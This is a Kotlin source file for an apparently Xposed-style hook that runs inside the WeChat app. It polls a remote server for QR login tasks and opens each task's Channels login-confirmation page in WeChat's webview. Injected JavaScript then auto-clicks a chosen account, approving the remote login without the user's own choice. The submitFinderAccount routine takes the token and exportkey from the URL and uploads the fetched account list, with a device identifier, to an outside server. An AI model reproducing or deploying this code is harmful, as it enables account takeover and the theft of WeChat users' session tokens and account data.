@file:Suppress("UNUSED_EXPRESSION")

package com.magic.xmagichooker

import android.app.Activity
import android.app.Instrumentation
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.text.TextUtils
import android.view.KeyEvent
import cc.sdkutil.controller.util.LogUtil
import com.google.gson.Gson
import com.magic.kernel.callMethod
import com.magic.kernel.callStaticMethod
import com.magic.kernel.findClass
import com.magic.kernel.getStaticObjectField
import com.magic.kernel.utils.ThreadUtil
import com.magic.shared.hookers.interfaces.IActivityHooker
import com.magic.wechat.hookers.interfaces.IFinderLiveHooker
import com.magic.wework.hookers.interfaces.IApplicationHooker
import com.magic.xmagichooker.model.BaseResult
import com.magic.xmagichooker.model.FinderList
import com.magic.xmagichooker.model.ScanQRLoginTask
import com.magic.xmagichooker.model.TencentBaseResult
import com.magic.xmagichooker.model.UploadResponse
import com.magic.xmagichooker.util.NetWorkUtil
import java.lang.ref.WeakReference
import java.net.URLDecoder
import java.net.URLEncoder


object WechatPlugins : IActivityHooker, IApplicationHooker, IFinderLiveHooker {
    val TAG = WechatPlugins::class.java.simpleName
    val mGson by lazy {
        Gson()
    }
    var loadLiveInfo = false
    var isInit = false
    val finder_account_key = "webview_key_user"
    val webview_open_key = "webview_open_key"
    val webview_open_task = "webview_open_task"
    val webview_open_alias = "webview_open_alias"
    val mmkv by lazy {
        //搜索：MULTIPROCESSMMKV_MULTI_DEFAULT
        val MultiProcessMMKV = "com.tencent.mm.sdk.platformtools.m4".findClass()
        LogUtil.e(WechatPlugins::class.java.name, "MultiProcessMMKV:$MultiProcessMMKV")
        //搜索：(str, 2, null)
        MultiProcessMMKV.callStaticMethod("G", "WebViewFontUtil")
    }

    val userAlias:String? by lazy {
        //搜索：put("last_login_alias",
        val mConfigStorageLogic = "tj0.b2".findClass()
        //搜索：42
        val alias = mConfigStorageLogic.callStaticMethod("b") as String?
        LogUtil.e(WechatPlugins::class.java.name, "alias:$alias")
        alias
    }
    val userWXID:String by lazy {
        val mConfigStorageLogic = "tj0.b2".findClass()
        //搜索：2,
        val username = mConfigStorageLogic.callStaticMethod("r") as String
        LogUtil.e(WechatPlugins::class.java.name, "username:$username")
        username
    }

    override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
        LogUtil.e(
            WechatPlugins::class.java.name,
            "onActivityCreated   class: ${activity.javaClass}"
        )

        if (activity.javaClass.name == "com.tencent.mm.plugin.webview.ui.tools.WebviewMpUI") {
            //WebviewMpUI页面
        }
        if (activity.javaClass.name == "com.tencent.mm.plugin.profile.ui.ContactInfoUI") {
            LogUtil.e(WechatPlugins::class.java.name,"alias:$userAlias")
//            openWebViewUI("https://channels.weixin.qq.com/mobile/confirm_login.html?token=AQAAAFAOLU2aNN0Zr7G8tA","wzhaha",Define.TASK_SCAN_QR_CODE,"w11210107z")
            //WebviewMpUI页面
        }

        LogUtil.e(WechatPlugins::class.java.name, "onActivityCreated22 *******")

    }

    override fun onActivityResumed(activity: Activity) {
        super.onActivityResumed(activity)
        onInit(activity)
    }

    private fun goBack() {
        ThreadUtil.submitTask {
            val inst = Instrumentation()
            inst.sendKeyDownUpSync(KeyEvent.KEYCODE_BACK)
        }
    }


    override fun onPageFinished(WebViewUI: Activity, WebView: Any, url: String) {
        LogUtil.e(WechatPlugins::class.java.name, "WebView onPageFinished $url")
        if (url.startsWith(Define.wechat_login_url)) {
            mmkv?.callMethod("putInt", webview_open_key, 1)
            mmkv?.callMethod("apply")
            val taskType = mmkv?.callMethod("r", "webview_open_task")
            when (taskType) {
                Define.TASK_SUBMIT_FINDER_LIST -> {
                    submitFinderAccount(url)
                    ThreadUtil.runOnMainThread({
                        LogUtil.e(WechatPlugins::class.java.name, "WebViewUI finish")
                        WebViewUI.callMethod("finish")
                    }, 5000L)
                }
                else -> {
                    val finder_account = mmkv?.callMethod("r", "webview_key_user")
                    LogUtil.e(WechatPlugins::class.java.name, "WebView finderAccount $finder_account")
                    /*val js =
                        "javascript:document.querySelector('.confirm .weui-btn.weui-btn_primary').click()"
                    val js =
                        "javascript:document.querySelectorAll('.multi-confirm .confirm-finder-list .confirm-item .confirm-name .name-content')"
                    val js = "javascript:window.Android.showToast('Hello!')"
                    val js =
                        "javascript:document.querySelectorAll('.multi-confirm .confirm-finder-list .confirm-item .confirm-name .name-content').forEach(item => {\n" +
                                "  if(item.innerText === '$finder_account'){\n" +
                                "    item.click()\n" +
                                "  }\n" +
                                "})"*/
                    val js =
                        "document.querySelectorAll('.multi-confirm .confirm-finder-list .confirm-item .confirm-name .name-content').forEach(item => {\n" +
                                "  if(item.innerText === '$finder_account'){\n" +
                                "    item.scrollIntoView({\n" +
                                "      behavior: \"smooth\",\n" +
                                "      block:\"center\"\n" +
                                "    })\n" +
                                "    setTimeout(() => {\n" +
                                "      item.click()\n" +
                                "    }, 1000)\n" +
                                "  }\n" +
                                "})"
                    LogUtil.e(WechatPlugins::class.java.name, "WebView js $js")
                    ThreadUtil.runOnMainThread({
                        /*val valueCallback2 = object :ValueCallback<String>{
                            override fun onReceiveValue(args: String?) {
                                LogUtil.e(WechatPlugins::class.java.name, "WebView ValueCallback2 args: ${args}")
                            }

                        }
                        WebView.callMethod("addJavascriptInterface",WechatJavascriptInterface(),"Android")*/
                        WebView.callMethod("evaluateJavascript", js, null)
                        ThreadUtil.runOnMainThread({
                            LogUtil.e(WechatPlugins::class.java.name, "WebViewUI finish")
                            WebViewUI.callMethod("finish")
                        }, 3000L)
                    }, 3000L)

                }
            }


        }


    }

    private fun submitFinderAccount(url: String) {
        val uri = Uri.parse(url)
        val token = uri.getQueryParameter("token")
        val exportkey = uri.getQueryParameter("exportkey")
        val params = mutableMapOf(
            "token" to URLEncoder.encode(token,"UTF-8"),
            "exportKey" to URLEncoder.encode(exportkey,"UTF-8"),
            "exportkey" to URLEncoder.encode(exportkey,"UTF-8")
        )
        ThreadUtil.submitTask {
            Thread.sleep(1000)
            val json = NetWorkUtil.postByUrlParams(Define.getFinderList(),params,"")
            val result = mGson.fromJson<TencentBaseResult<FinderList>>(
                json.toString(),
                genericType<TencentBaseResult<FinderList>>()
            )
            if (result.isSuccess) {
                val alias = mmkv?.callMethod("r", "webview_open_alias")?:""
                val map = mutableMapOf(
                    "accountList" to result.data.finderList,
                    "deviceId" to alias
                )
                val uploadJson = NetWorkUtil.postJson(Define.uploadAccountList(),map)
                val uploadResult = mGson.fromJson<BaseResult<UploadResponse>>(
                    uploadJson.toString(),
                    genericType<BaseResult<UploadResponse>>()
                )
                LogUtil.e(TAG,"upload result: ${uploadResult}")
            }

        }


    }

    private var mActivityRef: WeakReference<Activity>? = null

    fun setActivity(activity: Activity) {
        mActivityRef = WeakReference(activity)
    }

    private fun openWebViewUI(url: String, account: String,taskType:String,alias:String) {
        ThreadUtil.runOnMainThread {
            mmkv?.callMethod("putInt", webview_open_key, 0)
            mmkv?.callMethod("putString", finder_account_key, account)
            mmkv?.callMethod("putString", webview_open_task, taskType)
            mmkv?.callMethod("putString", webview_open_alias, alias)
            mmkv?.callMethod("apply")
            val intent = Intent()
//        intent.putExtra("rawUrl", "https://channels.weixin.qq.com/mobile/confirm_login.html?token=${token}")
            //搜索：start multi webview
            intent.putExtra("rawUrl", url)
//            val cClass = "com.tencent.mm.bz.c".findClass()
            val PluginHelper = "x54.l".findClass()
            LogUtil.e(WechatPlugins::class.java.name, "PluginHelper:$PluginHelper")
//            val MMApplicationContextClass =
//                "com.tencent.mm.sdk.platformtools.MMApplicationContext".findClass()
            //搜索：MicroMsg.MMApplicationContext
            val MMApplicationContextClass =
                "com.tencent.mm.sdk.platformtools.y2".findClass()
//            val context = MMApplicationContextClass.callStaticMethod("getContext") as Context
            //搜索：public static Context
            val context = MMApplicationContextClass.callStaticMethod("b") as Context
            //搜索：start multi webview
            PluginHelper.callStaticMethod("i", context, "webview", ".ui.tools.MMWebViewUI", intent)
        }
    }

    private @Synchronized
    fun onInit(activity: Any) {
        synchronized(this) {
            if (!isInit && (activity.javaClass.name == "com.tencent.mm.ui.LauncherUI")) {
                isInit = true
                init()
            }
        }
    }

//    override fun onCreate(bundle: Bundle) {
//        LogUtil.e(WechatPlugins::class.java.name, "onCreate bundle:$bundle -------")
//    }
//
//    override fun onResume(uiComponent:Any) {
//        LogUtil.e(WechatPlugins::class.java.name, "UIComponent onResume:$uiComponent")
//        if (uiComponent.javaClass.name == "com.tencent.mm.plugin.finder.live.viewmodel.component.i") {
//            val intent = uiComponent.callMethod("getIntent")
//            LogUtil.e(WechatPlugins::class.java.name, "UIComponent intent:$intent")
//            val finderLiveBundle = intent?.callMethod("getParcelableExtra", "KEY_PARAMS_CONFIG")
//            LogUtil.e(WechatPlugins::class.java.name, "UIComponent finderLiveBundle:$finderLiveBundle")
//        }
//        if (uiComponent.javaClass.name == "com.tencent.mm.plugin.finder.profile.uic.FinderProfileFeedUIC") {
//            //进入视频号主页
//            val intent = uiComponent.callMethod("getIntent")
//            val liveNoticeId = intent?.callMethod("getStringExtra", "KEY_FINDER_PROFILE_UI_REQUEST_LIST_POSITION")
//            LogUtil.e(TAG, "onFragmentResume liveNoticeId:$liveNoticeId")
//            val finderProfileFeedLoader = uiComponent.callMethod("getFeedLoader")
//            LogUtil.e(TAG, "onFragmentResume finderProfileFeedLoader:$finderProfileFeedLoader")
//
//            val dataList = finderProfileFeedLoader?.callMethod("getDataList")
//            LogUtil.e(TAG, "onFragmentResume dataList:$dataList")
//
//            val topicFilterList = finderProfileFeedLoader?.callMethod("getTopicFilterList")
//
//
//            LogUtil.e(TAG, "onFragmentResume topicFilterList:$topicFilterList")
//        }
//    }


    /*override fun getFollowContact(followListPresent: Any, aVar: Any, pVar: Any) {
        LogUtil.e(WechatPlugins::class.java.name, "FollowListPresent:getFollowContact$followListPresent")
        ThreadUtil.submitTask {
            val followList = followListPresent.getObjectField("qAW") as ArrayList<Any>

            LogUtil.e(TAG,"followList:$followList")
            val followListViewCallback = followListPresent.getObjectField("GFr")
            LogUtil.e(TAG,"getFollowContact followListViewCallback:$followListViewCallback")
            val mMActivity = followListViewCallback?.getObjectField("activity") as Activity
            followList.forEach {
                val contact = it.getObjectField("contact")
                LogUtil.e(TAG,"contact:$contact")
                val liveStatus = contact?.getIntField("field_liveStatus")
                LogUtil.e(TAG,"liveStatus:$liveStatus")
                val userName = contact?.callMethod("getUsername") as String
                LogUtil.e(TAG,"getFollowContact userName:$userName")
                if (liveStatus == 1) {
                    mMActivity?.let {
                        ThreadUtil.runOnMainThread({
                            enterFinderProfileUI(userName,it)
                        },1000L)
                    }
                }
                Thread.sleep(3000)
            }

        }




    }*/

//    override fun jumpToLive(baseFinderFeed: Any, i2: Int) {
//        LogUtil.e(TAG, "jumpToLive:$baseFinderFeed")
//        val finderItem = baseFinderFeed.getObjectField("feedObject")
//        LogUtil.e(TAG, "finderItem:$finderItem")
//        val finderObject = finderItem?.callMethod("getFeedObject")
//        LogUtil.e(TAG, "finderObject:$finderObject")
//        val liveInfo = finderObject?.getObjectField("liveInfo")
//        LogUtil.e(TAG, "liveInfo:$liveInfo")
//        val liveId = liveInfo?.getLongField("liveId")
//        LogUtil.e(TAG, "liveId:$liveId")
//        val streamUrl = liveInfo?.getObjectField("nom")
//        LogUtil.e(TAG, "streamUrl:$streamUrl")
//    }

//    override fun onFetchDone(finderProfileFeedLoader:Any,iResponse: Any) {
//        LogUtil.e(TAG, "onFetchDone:$iResponse")
//        if (iResponse.javaClass.name == "com.tencent.mm.plugin.finder.feed.model.FinderProfileFeedLoader\$ProfileResponse") {
//            val isRequestAll = iResponse.callMethod("isRequestAll")
//            LogUtil.e(TAG, "isRequestAll:$isRequestAll")
//            val topicFilterList = iResponse.callMethod("getFilterList")
//
//            LogUtil.e(TAG, "topicFilterList:$topicFilterList")
//
//            val pullType = iResponse.callMethod("getPullType")
//            val hasMore = iResponse.callMethod("getHasMore")
//            LogUtil.e(TAG, "pullType:$pullType")
//            LogUtil.e(TAG, "hasMore:$hasMore")
//            if (pullType == 1) {
//                val dataBuffer = finderProfileFeedLoader.callMethod("getDataList")
//                LogUtil.e(TAG, "onFetchDone dataList:$dataBuffer")
//                val finderFeed = dataBuffer?.callMethod("get", 0)
//                LogUtil.e(TAG, "onFetchDone finderFeed:$finderFeed")
//                val finderItem = finderFeed?.getObjectField("feedObject")
//                LogUtil.e(TAG, "onFetchDone finderItem:$finderItem")
//                val isLiveFeed = finderItem?.callMethod("isLiveFeed") as Boolean
//                if (isLiveFeed) {
//                    val finderObject = finderItem?.callMethod("getFinderObject")
//                    LogUtil.e(TAG, "finderObject:$finderObject")
//                    val liveInfo = finderObject?.getObjectField("liveInfo")
//                    LogUtil.e(TAG, "liveInfo:$liveInfo")
//                    val liveId = liveInfo?.getLongField("liveId")
//                    LogUtil.e(TAG, "liveId:$liveId")
//                    val streamUrl = liveInfo?.getObjectField("nom")
//                    LogUtil.e(TAG, "streamUrl:$streamUrl")/**/
//                }
//                loadLiveInfo = true
//            }
//            val readExist = finderProfileFeedLoader.getBooleanField("readExist")
//            val everIn = finderProfileFeedLoader.getBooleanField("everIn")
//            val allowPrefetch = finderProfileFeedLoader.getIntField("allowPrefetch")
//            val showJustWatch = finderProfileFeedLoader.getIntField("showJustWatch")
//            LogUtil.e(TAG, "readExist:$readExist,everIn:$everIn,allowPrefetch:$allowPrefetch,showJustWatch:$showJustWatch")
//        }
//    }

    /*override fun getFeedLoader(finderProfileFeedUIC:Any) {
        LogUtil.e(TAG, "FinderProfileFeedUIC onFilterDataChanged ")
        val activity = finderProfileFeedUIC.callMethod("getActivity") as Activity
        LogUtil.e(TAG, "FinderProfileFeedUIC activity$activity ")
        ThreadUtil.runOnMainThread({
            if (loadLiveInfo) {
                exitFinderProfileUI(activity)
            }
        },1500L)

    }*/

//    private fun exitFinderProfileUI(activity: Activity) {
//        LogUtil.e(TAG, "FinderProfileFeedUIC exitFinderProfileUI")
//        activity.finish()
//        loadLiveInfo = false
//    }


//    override fun onEnterFinderLiveVisitorUI(
//        r24: Intent,
//        r25: Context,
//        r26: Long,
//        r28: Long,
//        r29: String,
//        r30: String,
//        r31: String,
//        r32: String,
//        r33: String,
//        r34: String,
//        r35: Int,
//        r36: String,
//        r37: Int,
//        r38: Boolean
//    ) {
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r24:$r24")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r25:$r25")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r26:$r26")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r28:$r28")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r29:$r29")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r30:$r30")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r31:$r31")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r32:$r32")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r33:$r33")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r34:$r34")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r35:$r35")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r36:$r36")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r37:$r37")
//        LogUtil.e(WechatPlugins::class.java.name, "onEnterFinderLiveVisitorUI:r38:$r38")
//    }
//
//    override fun onViewCreated(view: View, bundle: Bundle) {
//        LogUtil.e(WechatPlugins::class.java.name, "onViewCreated bundle:$bundle -------")
//    }

//    override fun onFragmentResume(fragment: Any) {
//        LogUtil.e(WechatPlugins::class.java.name, "onFragmentResume fragment:${fragment.javaClass}")
//        if (fragment.javaClass.name == "com.tencent.mm.plugin.finder.profile.FinderProfileFeedFragment") {
//
//
//        }
//    }

    private fun enterFinderProfileUI(userName: String, mMActivity: Activity) {
        LogUtil.e(TAG, "enterFinderProfile userName:$userName")
        val intent = Intent()
        intent.putExtra("finder_username", userName)
        intent.putExtra("from_teen_mode_setting_page", false)
        intent.putExtra("KEY_FROM_TIMELINE", true)
        intent.putExtra(
            "KEY_DO_NOT_CHECK_ENTER_BIZ_PROFILE",
            true
        )
        val finderReporterUICCompanion =
            "com.tencent.mm.plugin.finder.viewmodel.component.ax\$a".findClass()
        finderReporterUICCompanion.callStaticMethod("a", mMActivity, intent, 0L, 1, false, 64)
        val activityRouterClazz = "com.tencent.mm.plugin.finder.utils.a".findClass()
        val activityRouter = activityRouterClazz.getStaticObjectField("HRh")
        activityRouter?.callMethod("enterFinderProfileUI", mMActivity, intent)
    }

    private fun init() {
        LogUtil.e(TAG, "init AlarmManager")
        IntervalLoginTask.startInterval(true)
    }


    fun getLoginTask() {
        val params = mutableMapOf<String, String?>()
        val wechatAlias = userAlias?: userWXID
        params["deviceId"] = wechatAlias
        ThreadUtil.submitTask {
            Thread.sleep(200L)
            val json = NetWorkUtil.get(Define.getLoginTask(), params)
            LogUtil.e(WechatPlugins::class.java.name, "json:$json")
            val response =
                mGson.fromJson<BaseResult<ScanQRLoginTask>>(
                    json.toString(),
                    genericType<BaseResult<ScanQRLoginTask>>()
                )
            val scanQRLoginTask = response.data
            if (scanQRLoginTask != null) {
                LogUtil.e(TAG, "getLoginTask response: $response")
                val account =
                    URLDecoder.decode(scanQRLoginTask?.extra?.selectorName ?: "", "UTF-8")
                val taskType = scanQRLoginTask.eventType ?:Define.TASK_SCAN_QR_CODE
                openWebViewUI(scanQRLoginTask.qrcodeDecodeRaw ?: "", account,taskType,
                    wechatAlias ?:""
                )
                //等待十秒检测是否还在授权页面
                Thread.sleep(10000L)
                val webViewOpen = mmkv?.callMethod("decodeInt", webview_open_key, 0)
                LogUtil.e(WechatPlugins::class.java.name, "WebView is open $webViewOpen")
                if (webViewOpen == 0) {
                    //webview打开但是没有回调，关闭重新打开
                    goBack()
                    Thread.sleep(2000L)
                    openWebViewUI(scanQRLoginTask.qrcodeDecodeRaw ?: "", account,taskType,
                        wechatAlias ?:"")
                }
            }
        }
    }

    private fun getWechatAlias(): String? {
        try {
            //搜索：put("last_login_alias",
            val mConfigStorageLogic = "tj0.b2".findClass()
            LogUtil.e(WechatPlugins::class.java.name, "mConfigStorageLogic:$mConfigStorageLogic")
            //搜索：42
            val curAlias = mConfigStorageLogic.callStaticMethod("c") as String?
            LogUtil.e(WechatPlugins::class.java.name, "curAlias:$curAlias")
            //搜索：2
            val curUsername = mConfigStorageLogic.callStaticMethod("r")
            LogUtil.e(WechatPlugins::class.java.name, "curUsername:$curUsername")
            return if (TextUtils.isEmpty(curAlias)) {
                curUsername as String
            } else {
                curAlias
            }
        } catch (e: Error) {
            e.printStackTrace()
        }
        return null
    }

}